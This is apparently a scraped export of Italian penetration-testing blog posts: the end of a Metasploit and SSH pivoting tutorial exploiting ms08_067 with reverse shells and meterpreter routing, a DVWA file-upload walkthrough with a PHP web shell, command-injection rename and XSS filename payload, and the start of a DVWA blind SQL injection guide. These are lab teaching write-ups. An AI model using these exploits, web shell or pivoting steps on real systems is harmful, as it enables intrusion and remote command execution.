]\r+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\r# Carico l\u0026#39;exploit\rmsf \u0026gt; use exploit/windows/smb/ms08_067_netapi\r# Scelgo il payload (shell)\rmsf exploit(ms08_067_netapi) \u0026gt; set payload windows/shell/reverse_tcp\rpayload =\u0026gt; windows/shell/reverse_tcp\r# Come host remoto setto il tunnel locale\r# Attenzione! Per instradare la connessione verso il tunnel utilizzare l\u0026#39;ip 0.0.0.0 e non 127.0.0.1\rmsf exploit(ms08_067_netapi) \u0026gt; set RHOST 0.0.0.0\rRHOST =\u0026gt; 0.0.0.0\r# Come porta remota setto la porta locale del tunnel\rmsf exploit(ms08_067_netapi) \u0026gt; set RPORT 9445\rRPORT =\u0026gt; 9445\r# L\u0026#39;ip che dovrà essere contattato dalla reverse shell è quello del client\rmsf exploit(ms08_067_netapi) \u0026gt; set LHOST 10.0.0.50\rLHOST =\u0026gt; 10.0.0.50\r# Ricontrollo la configurazione\rmsf exploit(ms08_067_netapi) \u0026gt; show options\rModule options (exploit/windows/smb/ms08_067_netapi):\rName Current Setting Required Description\r---- --------------- -------- -----------\rRHOST 0.0.0.0 yes The target address\rRPORT 9445 yes Set the SMB service port\rSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\rPayload options (windows/shell/reverse_tcp):\rName Current Setting Required Description\r---- --------------- -------- -----------\rEXITFUNC thread yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none)\rLHOST 10.0.0.50 yes The listen address\rLPORT 4444 yes The listen port Eseguo l’attacco msf exploit(ms08_067_netapi) \u0026gt; exploit\r[*] Started reverse TCP handler on 10.0.0.50:4444 [*] Automatically detecting the target...\r[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\r[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\r[*] Attempting to trigger the vulnerability...\r[*] Encoded stage with x86/shikata_ga_nai\r[*] Sending encoded stage (267 bytes) to 10.0.0.20\r[*] Command shell session 1 opened (10.0.0.50:4444 -\u0026gt; 10.0.0.20:1056) at 2016-04-12 23:21:58 +0200\rMicrosoft Windows XP [Version 5.1.2600]\r(C) Copyright 1985-2001 Microsoft Corp.\rC:\\WINDOWS\\system32\u0026gt;ipconfig\rWindows IP Configuration\rEthernet adapter Local Area Connection 2:\rConnection-specific DNS Suffix . : IP Address. . . . . . . . . . . . : 10.0.0.20\rSubnet Mask . . . . . . . . . . . : 255.255.255.0\rDefault Gateway . . . . . . . . . :\rC:\\WINDOWS\\system32\u0026gt; Attacco n.2 (Subnet Differente) Questo piano d’attacco è leggermente più complesso del precedente.\nIn questa situazione il Client (10.0.0.50/24) non può attaccare direttamente il server B (192.168.222.2/24) perché si trovano in reti lan e subnet differenti.\nPer ovviare a questo problema viene sfruttato il server A, dato che quest’ultimo ha accesso sia alle rete LAN che alla LAN_02.\nIn questo caso il server A non solo eseguirà un forward delle porte, ma fungerà anche da gateway così da eseguire un routing delle connessioni tra reti differenti.\nLa procedura può essere riassunta fondamentalmente in quattro punti:\n Il client crea un tunnel ssh locale sul server A per raggiungere la porta 445 del server B (freccia verde) Il client crea un tunnel ssh inverso in modo da potersi collegare alla reverse shell del server B ospitata dal server A (freccia blu) Il client sfruttando il tunnel (punto 1) compromette il server B ed esegue la reverse shell verso il server A (freccia viola) Il client sfrutta il tunnel (punto 2) per collegarsi alla reverse shell aperta sul server A  Tunnel (pivoting) Attraverso il server ssh 10.0.0.101, creo un forward tra la porta tcp locale del client 9445 e la 445 del server Windows Xp 192.168.222.2:\nclaudio@KaliCla:~$ ssh -L9445:192.168.222.2:445 root@10.0.0.101\r# Attraverso il server ssh 10.0.0.101, creo un reverse tunnel per redirigere la porta 4444 della\r# reverse shell verso il framework metasploit del client:\r# 192.168.222.2 -\u0026gt; 192.168.222.2.1:4444 -\u0026gt; 10.0.0.101:4444 -\u0026gt; 10.0.0.50:4444\rclaudio@KaliCla:~$ ssh -R 0.0.0.0:4444:127.0.0.1:4444 root@10.0.0.101  Importante!\nPer permettere anche ad host remoti di usufruire dei tunnel locali ssh, è necessario eseguire un bind delle porte verso l\u0026rsquo;indirizzo 0.0.0.0 .\nOltre a specificare l\u0026rsquo;indirizzo 0.0.0.0 è obbligatoria nella configurazione del server sshd l\u0026rsquo;opzione: GatewayPorts yes\nIn caso contrario tramite utente privilegiato l\u0026rsquo;opzione andrà abilitata.\n Preparo l’attacco Apro metasploit, carico l\u0026rsquo;exploit, scelgo il payload, configuro i parametri.\n# Carico l\u0026#39;exploit\rmsf \u0026gt; use exploit/windows/smb/ms08_067_netapi\r# Scelgo l\u0026#39;exploit (shell)\rmsf exploit(ms08_067_netapi) \u0026gt; set payload windows/shell/reverse_tcp\rpayload =\u0026gt; windows/shell/reverse_tcp\r# Come host remoto setto il tunnel locale\rmsf exploit(ms08_067_netapi) \u0026gt; set RHOST 0.0.0.0\rRHOST =\u0026gt; 0.0.0.0\r# Come porta remota setto la porta locale del tunnel\rmsf exploit(ms08_067_netapi) \u0026gt; set RPORT 9445\rRPORT =\u0026gt; 9445\r# Come host remoto della reverse shell setto l\u0026#39;indirizzo del server pivoting (server A)\rmsf exploit(ms08_067_netapi) \u0026gt; set LHOST 192.168.222.1\rLHOST =\u0026gt; 192.168.222.1\r# Controllo il riepilogo dei settaggi\rmsf exploit(ms08_067_netapi) \u0026gt; show options\rModule options (exploit/windows/smb/ms08_067_netapi):\rName Current Setting Required Description\r---- --------------- -------- -----------\rRHOST 0.0.0.0 yes The target address\rRPORT 9445 yes Set the SMB service port\rSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\rPayload options (windows/shell/reverse_tcp):\rName Current Setting Required Description\r---- --------------- -------- -----------\rEXITFUNC thread yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none)\rLHOST 192.168.222.1 yes The listen address\rLPORT 4444 yes The listen port\rExploit target:\rId Name\r-- ---- Eseguo l’attacco msf exploit(ms08_067_netapi) \u0026gt; exploit\r[-] Handler failed to bind to 192.168.222.1:4444:- -\r[*] Started reverse TCP handler on 0.0.0.0:4444 [*] Automatically detecting the target...\r[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\r[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\r[*] Attempting to trigger the vulnerability...\r[*] Encoded stage with x86/shikata_ga_nai\r[*] Sending encoded stage (267 bytes) to 127.0.0.1\r[*] Command shell session 1 opened (127.0.0.1:4444 -\u0026gt; 127.0.0.1:49963) at 2016-04-18 22:39:03 +0200\rMicrosoft Windows XP [Version 5.1.2600]\r(C) Copyright 1985-2001 Microsoft Corp.\rC:\\WINDOWS\\system32\u0026gt;ipconfig\ripconfig\rWindows IP Configuration\rEthernet adapter Local Area Connection 2:\rConnection-specific DNS Suffix . : IP Address. . . . . . . . . . . . : 192.168.222.2\rSubnet Mask . . . . . . . . . . . : 255.255.255.0\rDefault Gateway . . . . . . . . . : C:\\WINDOWS\\system32\u0026gt; Meterpeter Pivoting e Metasploit Oltre al protocollo ssh, è possibile utilizzare la tecnica pivoting sfruttando i server compromessi con metasploit.\nPer essere più precisi il componente che permette di effettuare routing di connessioni e forward delle porte è il famoso payload meterpeter.\nIl payload, come mostrato negli attacchi precedenti, non è altro che un tool che viene eseguito sulla macchina vittima subito dopo essere stata violata.\nNel caso di meterpeter il payload può essere considerato come una backdoor con moltissime utilità.\nComandi pivoting meterpeter run autoroute -s 192.168.1.0/24 # Routing di tutto il traffico verso la rete 192.168.1.x\rrun autoroute -p # Elenco delle rotte attive route add 192.168.1.0 255.255.255.0 2 # Routing verso la rete 192.168.1.x tramite sessione meterpeter 2 route del 192.168.1.0 255.255.255.0 2 # Rimuovo rotta sessione meterpeter 2 route flush # Rimuovo qualsiasi rotta portfwd add -l 222 -p 222 -r host # Forward porta 222 target compromesso verso porta 222 nuovo targer portfwd delete -l 222 -p 222 -r host # Rimozione forward porta 222 portfwd list # Lista port forwards attivi portfwd flus # Rimozione di tutti i port forwards Di seguito riporterò un esempio che mostrerà come scansionare una sotto rete raggiungibile esclusivamente da un server compromesso.\nPreparo l’attacco Apro metasploit, carico l\u0026rsquo;exploit, scelgo il payload, configuro i parametri:\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\rMMMMMMMMMMM MMMMMMMMMM\rMMMN$ vMMMM\rMMMNl MMMMM MMMMM JMMMM\rMMMNl MMMMMMMN NMMMMMMM JMMMM\rMMMNl MMMMMMMMMNmmmNMMMMMMMMM JMMMM\rMMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM\rMMMNI MMMMMMMMMMMMMMMMMMMMMMM jMMMM\rMMMNI MMMMM MMMMMMM MMMMM jMMMM\rMMMNI MMMMM MMMMMMM MMMMM jMMMM\rMMMNI MMMNM MMMMMMM MMMMM jMMMM\rMMMNI WMMMM MMMMMMM MMMM# JMMMM\rMMMMR ?MMNM MMMMM .dMMMM\rMMMMNm `?MMM MMMM` dMMMMM\rMMMMMMN ?MM MM? NMMMMMN\rMMMMMMMMNe JMMMMMNMMM\rMMMMMMMMMMNm, eMMMMMNMMNMM\rMMMMNNMNMMMMMNx MMMMMMNMMNMMNM\rMMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM\rhttp://metasploit.pro\rTired of typing \u0026#39;set RHOSTS\u0026#39;? Click \u0026amp; pwn with Metasploit Pro\rLearn more on http://rapid7.com/metasploit\r=[ metasploit v4.11.5-2016010401 ]\r+ -- --=[ 1517 exploits - 875 auxiliary - 257 post ]\r+ -- --=[ 437 payloads - 37 encoders - 8 nops ]\r+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\r# Carico l\u0026#39;exploit\rmsf \u0026gt; use exploit/windows/smb/ms08_067_netapi\r# Scelgo il payload meterpeter\rmsf exploit(ms08_067_netapi) \u0026gt; set payload windows/meterpreter/reverse_tcp\rpayload =\u0026gt; windows/meterpreter/reverse_tcp\r# Setto l\u0026#39;ip remoto della macchina da compromettere\rmsf exploit(ms08_067_netapi) \u0026gt; set RHOST 10.0.0.62\rRHOST =\u0026gt; 10.0.0.62\r# Setto l\u0026#39;ip del client per la reverse shell (meterpeter)\rmsf exploit(ms08_067_netapi) \u0026gt; set LHOST 10.0.0.50\rLHOST =\u0026gt; 10.0.0.50\r# Controllo i settaggi\rmsf exploit(ms08_067_netapi) \u0026gt; show options\rModule options (exploit/windows/smb/ms08_067_netapi):\rName Current Setting Required Description\r---- --------------- -------- -----------\rRHOST 10.0.0.62 yes The target address\rRPORT 445 yes Set the SMB service port\rSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\rPayload options (windows/meterpreter/reverse_tcp):\rName Current Setting Required Description\r---- --------------- -------- -----------\rEXITFUNC thread yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none)\rLHOST 10.0.0.50 yes The listen address\rLPORT 4444 yes The listen port\rExploit target:\rId Name\r-- ----\r0 Automatic Targeting Eseguo l’attacco Eseguo l\u0026rsquo;exploit e acquisisco le informazioni di networking\nmsf exploit(ms08_067_netapi) \u0026gt; exploit\r[*] Started reverse TCP handler on 10.0.0.50:4444 [*] Automatically detecting the target...\r[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\r[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\r[*] Attempting to trigger the vulnerability...\r[*] Sending stage (957487 bytes) to 10.0.0.62\r[*] Meterpreter session 1 opened (10.0.0.50:4444 -\u0026gt; 10.0.0.62:1035) at 2016-04-21 18:37:37 +0200\rmeterpreter \u0026gt;\r# Controllo la configurazione delle interfacce di rete meterpreter \u0026gt; ipconfig\rInterface 1\r============\rName : MS TCP Loopback interface\rHardware MAC : 00:00:00:00:00:00\rMTU : 1520\rIPv4 Address : 127.0.0.1\rInterface 2\r============\rName : VMware Accelerated AMD PCNet Adapter #2 - Packet Scheduler Miniport\rHardware MAC : 00:0c:29:a8:aa:f7\rMTU : 1500\rIPv4 Address : 10.0.0.62\rIPv4 Netmask : 255.255.255.0\rInterface 3\r============\rName : VMware Accelerated AMD PCNet Adapter - Packet Scheduler Miniport\rHardware MAC : 00:0c:29:a8:aa:01\rMTU : 1500\rIPv4 Address : 192.168.222.2\rIPv4 Netmask : 255.255.255.0 Routing del traffico (pivoting) # Tramite il comando autorute di meterpeter aggiungo una route statica che permette # al framework metasploit di raggiungere tutta la rete 192.168.222.x tramite il server\r# appena compromesso (10.0.0.62).\rmeterpreter \u0026gt; run autoroute -s 192.168.222.0/24\r[*] Adding a route to 192.168.222.0/255.255.255.0...\r[+] Added route to 192.168.222.0/255.255.255.0 via 10.0.0.62\r[*] Use the -p option to list all active routes\r# Tramite lo switch \u0026#34;-p\u0026#34; del comando autoroute, visualizzo le route statiche presenti meterpreter \u0026gt; run autoroute -p\rActive Routing Table\r====================\rSubnet Netmask Gateway\r------ ------- -------\r192.168.222.0 255.255.255.0 Session 1\rmeterpreter \u0026gt;\r# Premendo i tasti Ctrl+z e poi y mando la sessione in background Background session 1? [y/N]\rmsf exploit(ms08_067_netapi) \u0026gt; Individuazione nuovi target Carico il modulo port scanner di metasploit per scansionare la rete 192.168.222.x:\n# Carico il modulo port scanner di metasploit per scansionare la rete 192.168.222.x\rmsf exploit(ms08_067_netapi) \u0026gt; use auxiliary/scanner/portscan/tcp\r# Controllo le opzioni disponibili\rmsf auxiliary(tcp) \u0026gt; show options\rModule options (auxiliary/scanner/portscan/tcp):\rName Current Setting Required Description\r---- --------------- -------- -----------\rCONCURRENCY 10 yes The number of concurrent ports to check per host\rPORTS 1-10000 yes Ports to scan (e.g. 22-25,80,110-900)\rRHOSTS yes The target address range or CIDR identifier\rTHREADS 1 yes The number of concurrent threads\rTIMEOUT 1000 yes The socket connect timeout in milliseconds\r# Setto la subnet da scansionare\rmsf auxiliary(tcp) \u0026gt; set RHOSTS 192.168.222.0/24\rRHOSTS =\u0026gt; 192.168.222.0/24\r# Setto i threads da utilizzare\rmsf auxiliary(tcp) \u0026gt; set THREADS 50\rTHREADS =\u0026gt; 50\r# Setto il rage di porte da interrogare\rmsf auxiliary(tcp) \u0026gt; set PORTS 1-60000\rPORTS =\u0026gt; 1-60000\r# Faccio partire la scansione\rmsf auxiliary(tcp) \u0026gt; run\r[*] 192.168.222.2:21 - TCP OPEN\r[*] 192.168.222.3:22 - TCP OPEN\r[*] 192.168.222.2:25 - TCP OPEN\r[*] 192.168.222.3:80 - TCP OPEN\r[*] 192.168.222.2:80 - TCP OPEN\r[*] 192.168.222.2:135 - TCP OPEN\r[*] 192.168.222.2:139 - TCP OPEN\r[*] 192.168.222.2:180 - TCP OPEN\r[*] 192.168.222.3:443 - TCP OPEN\r[*] 192.168.222.2:443 - TCP OPEN\r[*] 192.168.222.2:445 - TCP OPEN\r[*] Scanned 256 of 256 hosts (100% complete)\r[*] Auxiliary module execution completed\rmsf auxiliary(tcp) \u0026gt; E’ possibile notare come il client (10.0.0.50) sia stato in grado di scansionare e rilevare le porte aperte del server 192.168.222.3 .\nNaturalmente oltre ad una scansione è possibile utilizzare altri exploit per compromettere ulteriori macchine.\nConclusioni Per un penetration tester la tecnica pivoting è molto importante, sia nel lavoro che nella buona riuscita di una certificazione.\nIl consiglio che posso darvi è come al solito di provare, sperimentare e documentarsi il più possibile perchè il routing delle connessioni e il forward delle porte posso essere effettuati in molti modi.\nPer qualsiasi segnalazione di errore, chiarimento o altro non esistate a commentare il post.\nAlla prossima!\n","permalink":"https://www.homelab.it/index.php/2016/04/21/metasploit-ssh-meterpeter-pivoting/","summary":"Nell’articolo di oggi tratterò un argomento fondamentale nel penetration testing, ovvero la tecnica “Pivoting“.\nPivoting in italiano può essere tradotto come “fare perno”, infatti questa tecnica si basa sullo sfruttamento di un sistema compromesso per attaccarne altri all’interno della stessa infrastruttura (e non solo).\nFaccio un piccolo esempio in cui ci sono tre attori:\n Client (attaccante) Server A – Accetta qualsiasi connessione Server B – Accetta esclusivamente connessione dal server A  Instradare le connessioni tramite il server compromesso A, verso il server B, permette all’attaccante non solo di raggiungere il target desiderato ma anche di utilizzare comodamente i tools/frameworks installati nel proprio client o workstation.","title":"SSH e Meterpeter pivoting"},{"content":"Nuovo post sull’applicazione DVWA, oggi risolveremo la vulnerabilità: DVWA File Upload.\nI requisiti sono:\n DVWA Command Injection completato, in caso contrario non proseguite! Qualsiasi Browser Proxy tipo Burpsuite e Zap o browser plugin tipo Tamper Data Editor di immagini, ad esempio GIMP  Lo scopo di questa vulnerabilità è quello di riuscire a caricare sul server remoto una web shell attaccando una pagina dedita all’upload di immagini.\nDVWA File Upload – Low Level Il livello semplice, come ormai sappiamo, non ha alcun tipo di protezione quindi faremo l’upload di una web shell php.\nCome esempio ho deciso di utilizzare questo semplice script “pwn3dshell.php” :\n\u0026lt;?php if(isset($_REQUEST[\u0026#39;cmd\u0026#39;])){ echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; $cmd = ($_REQUEST[\u0026#39;cmd\u0026#39;]); system($cmd); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; die; } ?\u0026gt; L’utilizzo è semplice, basta richiamare lo script passandogli i comandi da eseguire tramite la variabile cmd.\nDopo l’upload la pagina bacata ci spiattella in rosso il path dello script appena caricato:\nPer richiamare la backdoor basterà inserire il seguente url:\nhttp://ip_server/DVWA/hackable/uploads/pwn3dshell.php?cmd=whoami\nCome si può notare il comando whoami è stato eseguito dalla web shell.\nDi seguito il sorgente privo di alcuna protezione:\nDVWA File Upload – Medium Level Nel livello medio non è permesso l’invio a cuor leggero di uno script php:\nDal messaggio è evidente come la pagina si aspetti un file di tipo JPEG o PNG.\nTramite un proxy o plugin è possibile intercettare e modificare le richieste del browser prima di inviarle verso il server.\nNell’esempio seguente utilizzerò il plugin Firefox Tamper Data per modificare il Content-Type originale del file php:\nspacciandolo per un vera e propria immagine jpeg:\nE come per magia:\nDai sorgenti si possono notare due gravi errori:\n Non c’è alcun tipo di controllo sull’estensione del file L’unico controllo che viene fatto è sul $_FILES[ 'uploaded' ][ 'type' ];, scelta sbagliatissima dato che è ormai\nnoto che il Content-Type è un parametro manipolabile!  DVWA File Upload – High Level Come scrivevo nell’articolo d’introduzione “DVWA – Damn Vulnerable Web Application” per risolvere alcune vulnerabilità è necessario ingegnarsi un minimo senza limitarsi al bug stesso…un po come nelle competizioni CTF.\nIn questo livello naturalmente le tecniche usate precedentemente non hanno alcun effetto, quindi ho optato nell’inserimento di codice php all’interno dei commenti dell’immagine sperando poi di trovare il modo di far interpretare il file appena caricato come script php.\nPer modificare le proprietà dell’immagine homelabit_evil.png ho utilizzato l’editor GIMP:\nInserimento codice php nei commenti dell’immagine\nCome si nota dallo screenshot precedente ho inserito la classica funzione phpinfo() nei commenti del dell’immagine.\nA questo punto le strade da percorrere che mi vengono in mente per far eseguire al webserer un gile png come php sono almeno due:\n Caricare nella directory di upload un file .htaccess come il seguente:\nAddType application/x-httpd-php .png Sfruttare un’altra vulnerabilità per rinominare il file png  La soluzione numero uno non è percorribile dato che il form ha un efficace controllo sull’estensione dei file, quindi perché non sfruttare la vulnerabilità Command Injection?\nMa andiamo con ordine, prima di tutto ho eseguito l’upload dell’immagine modificata così da poter vedere anche la directory di repository.\nDallo screenshot si capisce che la directory interessata è la seguente “../../hackables/uploads/“, per conferma dalla pagina “Command Injections” ho controllato il contenuto iniettando il comando “|ls ../../hackable/uploads/“:\nLocalizzata l’immagine ho rinominato l’estensione da png a php iniettando il comando “|mv ../../hackable/uploads/homelabit_evil.png ../../hackable/uploads/homelabit_evil.php ” dopo di che ho ricontrollato il contenuto:\nInfine dal browser ho richiamato l’url: “http://10.0.0.100/DVWA/hackable/uploads/homelabit_evil.php”\nCodice php eseguito con successo!\nDal sorgente è interessante estrapolare questa parte:\n // Is it an image? if( ( strtolower( $uploaded_ext ) == \u0026#34;jpg\u0026#34; || strtolower( $uploaded_ext ) == \u0026#34;jpeg\u0026#34; || strtolower( $uploaded_ext ) == \u0026#34;png\u0026#34; ) \u0026amp;\u0026amp; ( $uploaded_size \u0026lt; 100000 ) \u0026amp;\u0026amp; getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // No echo \u0026#39;\u0026lt;pre\u0026gt;Your image was not uploaded.\u0026lt;/pre\u0026gt;\u0026#39;; } else { // Yes! echo \u0026#34;\u0026lt;pre\u0026gt;{$target_path} succesfully uploaded!\u0026lt;/pre\u0026gt;\u0026#34;; } } else { // Invalid file echo \u0026#39;\u0026lt;pre\u0026gt;Your image was not uploaded. We can only accept JPEG or PNG images.\u0026lt;/pre\u0026gt;\u0026#39;; } } Nel codice viene utilizzata la funzione getimagesize() per controllare se il file caricato è un immagine o meno, ma come visto in precedenza manipolando l’immagine il controllo viene bypassato.\nDVWA File Upload – Impossible Level (mitigazione) Questo è il sorgente sicuro proposto:\n \u0026lt;?php if( isset( $_POST[ \u0026#39;Upload\u0026#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ \u0026#39;user_token\u0026#39; ], $_SESSION[ \u0026#39;session_token\u0026#39; ], \u0026#39;index.php\u0026#39; ); // File information $uploaded_name = $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;name\u0026#39; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, \u0026#39;.\u0026#39; ) + 1); $uploaded_size = $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;size\u0026#39; ]; $uploaded_type = $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;type\u0026#39; ]; $uploaded_tmp = $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;tmp_name\u0026#39; ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \u0026#39;hackable/uploads/\u0026#39;; //$target_file = basename( $uploaded_name, \u0026#39;.\u0026#39; . $uploaded_ext ) . \u0026#39;-\u0026#39;; $target_file = md5( uniqid() . $uploaded_name ) . \u0026#39;.\u0026#39; . $uploaded_ext; $temp_file = ( ( ini_get( \u0026#39;upload_tmp_dir\u0026#39; ) == \u0026#39;\u0026#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( \u0026#39;upload_tmp_dir\u0026#39; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . \u0026#39;.\u0026#39; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == \u0026#39;jpg\u0026#39; || strtolower( $uploaded_ext ) == \u0026#39;jpeg\u0026#39; || strtolower( $uploaded_ext ) == \u0026#39;png\u0026#39; ) \u0026amp;\u0026amp; ( $uploaded_size \u0026lt; 100000 ) \u0026amp;\u0026amp; ( $uploaded_type == \u0026#39;image/jpeg\u0026#39; || $uploaded_type == \u0026#39;image/png\u0026#39; ) \u0026amp;\u0026amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == \u0026#39;image/jpeg\u0026#39; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo \u0026#34;\u0026lt;pre\u0026gt;\u0026lt;a href=\u0026#39;${target_path}${target_file}\u0026#39;\u0026gt;${target_file}\u0026lt;/a\u0026gt; succesfully uploaded!\u0026lt;/pre\u0026gt;\u0026#34;; } else { // No echo \u0026#39;\u0026lt;pre\u0026gt;Your image was not uploaded.\u0026lt;/pre\u0026gt;\u0026#39;; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo \u0026#39;\u0026lt;pre\u0026gt;Your image was not uploaded. We can only accept JPEG or PNG images.\u0026lt;/pre\u0026gt;\u0026#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt; A mio parere, oltre al controllo dell’estensione e della tipologia del file, sono importanti due parti del codice (in grassetto):\n La funzione che controlla qualsiasi metadata dell’immagine tramite re-encodingm, rimuovendo eventuali stringhe\ndi codice pericolose. Una volta eseguito l’upload del file, stampare a video un messaggio di conferma senza specificare il path completo locale\ndell’immagine  DVWA File Upload – Bonus XSS Eccoci alla parte più divertente!\nIn tutti e tre i livelli vulnerabili, low, medium, high, ho notato che al momento dell’upload avvenuto con successo veniva stampato a video il nome dell’immagine caricata all’interno di un tag .\nA quel punto mi sono chiesto: Perchè non caricare un’immagine inserendo un payload xss nel nome del file?\nNon potendo utilizzare il carattere / nel nome del file, e quindi impossibilitato a chiudere i tag html, ho optato per un payload che sfrutta l’attributo href malformato:\nclickme\nPotete testare il payload su https://jsfiddle.net tramite browser Mozilla Firefox.\nPer saltare i controlli del livello high, ho preso come esempio un immagine png genuina lasciando anche l’estensione corretta:\n# i vari backslash servono a non fare interpretare i caratteri speciali alla shell\nclaudio@KaliCla:~/Pictures$ cp homelabit_evil.png \\\u0026lt;a\\ onmouseover=alert\\(1\\)\\\u0026gt;clickme.png\nEcco il risultato dopo l’upload dell’immagine:\nE’ possibile notare come il nome del file sia diventato un link cliccabile, il sorgente rende tutto più chiaro:\nEd al passaggio del mouse sul link….\nTadaaaaa XSSED!\nUn saluto! Alla prossima!\n","permalink":"https://www.homelab.it/index.php/2016/03/02/dvwa-file-upload-soluzione-completa/","summary":"Nuovo post sull’applicazione DVWA, oggi risolveremo la vulnerabilità: DVWA File Upload.\nI requisiti sono:\n DVWA Command Injection completato, in caso contrario non proseguite! Qualsiasi Browser Proxy tipo Burpsuite e Zap o browser plugin tipo Tamper Data Editor di immagini, ad esempio GIMP  Lo scopo di questa vulnerabilità è quello di riuscire a caricare sul server remoto una web shell attaccando una pagina dedita all’upload di immagini.\nDVWA File Upload – Low Level Il livello semplice, come ormai sappiamo, non ha alcun tipo di protezione quindi faremo l’upload di una web shell php.","title":"DVWA File Upload – Soluzione Completa + Bonus XSS"},{"content":"Ciao a tutti, la write-up di oggi riguarderà la vulnerabilità DVWA SQL Injection.\nI requisiti sono:\n Conoscenze minime MySQL Qualsiasi Browser Proxy tipo Burpsuite e Zap o browser plugin tipo Tamper Data  L’app DVWA propone due tipi di vulnerabilità, SQL Injection, e SQL Injection Blind.\nInizierò subito con la vulnerabilità SQL Injection Blind dato che è la più complicata e divertente da scovare.\nIl risultato di un attacco SQL Injection nei migliori dei casi restituirà il classico messaggio:\n\u0026ldquo;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right etc\u0026hellip;\nMa non è sempre così, alcune pagine vulnerabili in caso di errore potrebbero mostrare l’intera pagina senza porzioni di testo o immagini che normalmente verrebbero visualizzate.\nPer questo procedere all’individuazione delle injection, un po alla cieca, deriva il termine Blind.\nDVWA SQL Injection Blind – Low Level Come al solito nel livello basso non bisogna aspettarsi nessun controllo particolare.\nLa prima cosa fondamentale è quella di vedere come si comporta la pagina vulnerabile in caso di errori o meno, così da poter confrontare i risultati con i paylods.\nLa pagina richiede di inserire un numero id, e la mia scelta è ricaduta sul numero1:\nDVWA SQL Injection 01 – Output Ok\nPer riprodurre un errore ho inserito il classico apice:\nDVWA SQL Injection 02 – Output con Errore\nA questo punto avendo tutti e due i tipi di risposta è possibile attaccare lo sctipt per fare dei raffronti.\nIniettando una query mysql che restituisce sempre un risultato falso, mi aspetto di ricevere un risultato identico allo screenshot precedente (fig. 02).\nLa condizione “AND 1=2 #” restituirà sempre un errore perché 1 non sarà mai uguale a 2. Il cancelletto serve a commentare il proseguo della query vulnerabile.\nDVWA SQL Injection 03 – Injection Low Level con errore\nPer avere la conferma di aver trovato il payload giusto, vado ad iniettare una query che darà un risultato positivo.\nLa condizione AND 1=1 #” non restituirà mai un errore perché 1 sarà sempre uguale a 1. Il cancelletto serve a commentare il proseguo della query vulnerabile.\nDVWA SQL Injection 04 – Injection Low Level senza errore\nBingo! Confrontando lo screenshot 04 con lo 01 si può notare il medesimo risultato!\nDVWA SQL Injection 05 – Sorgente Low Level\nIl sorgente è chiaro, non esiste alcun filtro sulla variabile $id:\n // Get input $id = $_GET[ \u0026#39;id\u0026#39; ]; Questa è la query originale:\n $getid = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = \u0026#39;$id\u0026#39;;\u0026#34;; Mentre questa è il risultato della query dopo l’injection:\n $getid = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = \u0026#39;1\u0026#39; and 1=1 #;\u0026#34;; DVWA SQL Injection Blind – Medium Level In questo livello è necessario utilizzare un plugin o proxy che permetta di intercettare o manipolare le richieste $_POST , io ho optato per il proxy Burp Suite.\nPer prima cosa ho configurato il proxy nelle impostazioni del browser FireFox :\nDVWA SQL Injection 06 – Medium Level Configurazione Burp Suite\nCome di consueto controllo la risposta della pagina senza iniettare alcun payload:\nDVWA SQL Injection 07 – Medium Level Risposta Burp Suite\nTramite metodo $_POST viene inviato un intero tramite la variabile id, vediamo il risultato:\nDVWA SQL Injection 08 – Medium Level Risposta corretta\nL’attacco utilizzato nel precedente livello naturalmente non può funzionare, quindi ho modificato leggermente il payload.\nQuesta volta testo per prima la condizione positiva senza apice e cancelletto, ovvero “1 and 1=1“.\nPer fare ciò modifico la richiesta intercettata dal proxy e la eseguo premendo il bottone “Forward“:\nDVWA SQL Injection 09 – Medium Level preparazione attacco\nLa risposta è interessante, sembra a tutti gli effetti identica allo screenshot numero 08.\nDVWA SQL Injection 10 – Injection Medium Level senza errore\nPer verificare la vulnerabilità, tramite il proxy inietto una condizione negativa”1 and 1=2” :\nDVWA SQL Injection 11 – Medium Level preparazione 